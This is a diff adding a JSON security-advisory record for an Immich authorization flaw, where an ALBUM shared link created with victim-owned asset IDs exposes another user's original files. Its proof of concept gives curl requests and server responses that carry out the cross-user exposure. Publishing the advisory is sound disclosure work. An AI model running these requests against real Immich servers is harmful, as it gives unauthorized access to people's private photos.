@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-g4w3-c888-cr93",
+  "repo": {
+    "cve_id": "CVE-2026-119330",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 3.5,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-285"
+    ],
+    "description": "### Summary\r\nImmich 3.1.0 permits an authenticated user to create an `ALBUM` shared link\r\nthat contains both an attacker-owned `albumId` and victim-owned `assetIds`.\r\nThe server authorizes only the album, persists the unchecked asset IDs, and\r\nthen treats those assets as accessible through the new anonymous shared-link\r\ncredential.\r\n\r\nAn unrelated regular user can therefore expose and download another user's\r\ncomplete original file if the victim asset UUID is known.\r\n\r\n### Details\r\n`SharedLinkCreateDto` for API CreateSharedLink accepts `albumId` and `assetIds` as independent optional\r\nproperties. It does not enforce the type-dependent invariant:\r\n\r\n- `ALBUM` must contain an `albumId` and must not contain `assetIds`;\r\n- `INDIVIDUAL` must contain nonempty `assetIds` and must not contain an\r\n  `albumId`.\r\n\r\n\r\nIn file: server/src/services/shared-link.service.ts:69\r\nThe service checks only the resource corresponding to `type`:\r\n```ts\r\ncase SharedLinkType.Album: {\r\n  if (!dto.albumId) {\r\n    throw new BadRequestException('Invalid albumId');\r\n  }\r\n  await this.requireAccess({\r\n    auth,\r\n    permission: Permission.AlbumShare,\r\n    ids: [dto.albumId],\r\n  });\r\n  break;\r\n}\r\n\r\ncase SharedLinkType.Individual: {\r\n  if (!dto.assetIds || dto.assetIds.length === 0) {\r\n    throw new BadRequestException('Invalid assetIds');\r\n  }\r\n  await this.requireAccess({\r\n    auth,\r\n    permission: Permission.AssetShare,\r\n    ids: dto.assetIds,\r\n  });\r\n  break;\r\n}\r\n```\r\n\r\nBoth  `albumId` and `assetIds` fields  are nevertheless passed to persistence regardless what value the `type` is:\r\n\r\n```ts\r\nconst sharedLink = await this.sharedLinkRepository.create({\r\n  key: this.cryptoRepository.randomBytes(50),\r\n  userId: auth.user.id,\r\n  type: dto.type,\r\n  albumId: dto.albumId || null,\r\n  assetIds: dto.assetIds,\r\n  // ...\r\n});\r\n```\r\n\r\nThe repository inserts every supplied `assetId` into `shared_link_asset`\r\nwithout another ownership check:\r\n\r\n```ts\r\nif (entity.assetIds && entity.assetIds.length > 0) {\r\n  await this.db\r\n    .insertInto('shared_link_asset')\r\n    .values(entity.assetIds.map((assetId) => ({ assetId, sharedLinkId: id })))\r\n    .execute();\r\n}\r\n```\r\n\r\nTherefore, if attacker selects type to be ALBUM, the provided asset will bypass the ownership check\r\n\r\n### PoC\r\n1. Get the authorization tokens for two regular users: 1) ATTACKER_TOEKN and 2) VICTIM_TokeN\r\n2. Upload an Asset as Victim\r\n\r\nRequest:\r\n```bash\r\nVICTIM_UPLOAD=\"$(curl --fail-with-body -sS \\\r\n  -X POST \"$BASE_URL/assets\" \\\r\n  -H \"Authorization: Bearer $VICTIM_TOKEN\" \\\r\n  -F 'assetData=@-;filename=victim.png;type=image/png' \\\r\n  -F \"filename=victim.png\" \\\r\n  -F \"fileCreatedAt=<timestamp>\" \\\r\n  -F \"fileModifiedAt=<timestamp>\")\"\r\n\r\nexport VICTIM_ASSET_ID=\"$(printf '%s' \"$VICTIM_UPLOAD\" | jq -r '.id')\"\r\nprintf '%s\\n' \"$VICTIM_UPLOAD\" | jq .\r\n```\r\nResponse\r\n```json\r\n{\r\n  \"id\": \"92eb6804-12d0-4cec-b557-dbeb89e1eee0\",\r\n  \"status\": \"created\"\r\n}\r\n```\r\n4. Create an album as the attacker\r\n\r\nRequest:\r\n```bash\r\nATTACKER_ALBUM=\"$(curl --fail-with-body -sS \\\r\n  -X POST \"$BASE_URL/albums\" \\\r\n  -H \"Authorization: Bearer $ATTACKER_TOKEN\" \\\r\n  -H 'Content-Type: application/json' \\\r\n  --data \"{\\\"albumName\\\":\\\"attacker-${RUN_ID}\\\"}\")\"\r\n\r\nexport ATTACKER_ALBUM_ID=\"$(printf '%s' \"$ATTACKER_ALBUM\" | jq -r '.id')\"\r\nprintf '%s\\n' \"$ATTACKER_ALBUM\" | jq '{id,albumName,assetCount}'\r\n```\r\nResponse:\r\n```json\r\n{\"albumName\":\"attacker-\",\"description\":\"\",\"albumThumbnailAssetId\":null,\"createdAt\":\"2026-08-13T19:17:24.816Z\",\"updatedAt\":\"2026-08-13T19:17:24.816Z\",\"id\":\"9863f07b-5c44-4e8c-afae-b122d687e813\",\"albumUsers\":[{\"user\":{\"id\":\"bc8a18f7-35b8-44d7-a2ff-1f3c58b551f3\",\"email\":\"userb@example.test\",\"name\":\"Regular Member B\",\"profileImagePath\":\"\",\"avatarColor\":\"pink\",\"profileChangedAt\":\"2026-08-13T19:06:36.883051+00:00\"},\"role\":\"owner\"}],\"shared\":false,\"hasSharedLink\":false,\"assetCount\":0,\"isActivityEnabled\":true,\"order\":\"desc\"}\r\n```\r\n5. Create a shared link for attacker's own album and the victim's asset as the attacker\r\n\r\nRequest:\r\n```bash\r\ncurl -i -sS \\\r\n    -X POST \"$BASE_URL/shared-links\" \\\r\n    -H \"Authorization: Bearer $ATTACKER_TOKEN\" \\\r\n    -H \"Content-Type: application/json\" \\\r\n    --data-raw \"{\r\n      \\\"type\\\": \\\"ALBUM\\\",\r\n      \\\"albumId\\\": \\\"$ATTACKER_ALBUM_ID\\\",\r\n      \\\"assetIds\\\": [\\\"$VICTIM_ASSET_ID\\\"],\r\n      \\\"allowDownload\\\": true,\r\n      \\\"showMetadata\\\": true,\r\n      \\\"description\\\": \\\"cross-owner shared-link PoC\\\"\r\n    }\"\r\n```\r\nResponse:\r\n```json\r\n{\"id\":\"f9edc40c-c042-49ed-9a15-0ed5d13af0a6\",\"description\":\"cross-owner shared-link PoC\",\"password\":null,\"userId\":\"bc8a18f7-35b8-44d7-a2ff-1f3c58b551f3\",\"key\":\"<mark>\",\"type\":\"ALBUM\",\"createdAt\":\"2026-08-13T19:21:13.608Z\",\"expiresAt\":null,\"assets\":[{\"id\":\"92eb6804-12d0-4cec-b557-dbeb89e1eee0\",\"createdAt\":\"2026-08-13T19:16:41.64173+00:00\",\"ownerId\":\"a8d8736f-fe70-421f-ba95-f2c3a70591d1\",\"libraryId\":null,\"type\":\"IMAGE\",\"originalPath\":\"/data/upload/a8d8736f-fe70-421f-ba95-f2c3a70591d1/b9/d3/b9d3d98f-59a0-4248-866f-2ec5ebf81db4.png\",\"originalFileName\":\"victim-.png\",\"originalMimeType\":\"image/png\",\"thumbhash\":\"AAgCBwAAAAAAAAAAAAAAAAAAAAAAAAAA\",\"fileCreatedAt\":\"2026-08-13T19:16:15+00:00\",\"fileModifiedAt\":\"2026-08-13T19:16:15+00:00\",\"localDateTime\":\"2026-08-13T19:16:15+00:00\",\"updatedAt\":\"2026-08-13T19:16:41.812956+00:00\",\"isFavorite\":false,\"isArchived\":false,\"isTrashed\":false,\"visibility\":\"timeline\",\"duration\":null,\"livePhotoVideoId\":null,\"people\":[],\"checksum\":\"zgjIoAwqCtcmdginvs7hIl+8JgQ=\",\"isOffline\":false,\"hasMetadata\":true,\"duplicateId\":null,\"resized\":true,\"width\":1,\"height\":1,\"isEdited\":false}],\"allowUpload\":true,\"allowDownload\":true,\"showMetadata\":true,\"slug\":null}\r\n```\r\n### Impact\r\nThe resulting link is an anonymous credential that can access a resource the\r\nattacker could not access directly. Confirmed effects include:\r\n\r\n- disclosure of victim asset metadata;\r\n- disclosure of a rendered thumbnail;\r\n- download of the byte-identical original victim file;\r\n- creation of a persistent attacker-controlled sharing relationship involving\r\n  the victim resource; and\r\n- redistribution of the shared link to unauthenticated third parties.\r\n",
+    "ghsa_id": "GHSA-g4w3-c888-cr93",
+    "html_url": "https://github.com/immich-app/immich/security/advisories/GHSA-g4w3-c888-cr93",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-g4w3-c888-cr93"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-119330"
+      }
+    ],
+    "published_at": "2026-10-19T14:15:08Z",
+    "references": [],
+    "severity": "low",
+    "summary": "A regular user can create SharedLink for album/asset belonging to another user through CreateSharedLink API",
+    "updated_at": "2026-10-30T19:52:10Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": ""
+        },
+        "patched_versions": "v3.2.0",
+        "vulnerable_version_range": "<=3.1.0"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "immich-app/immich"
+}
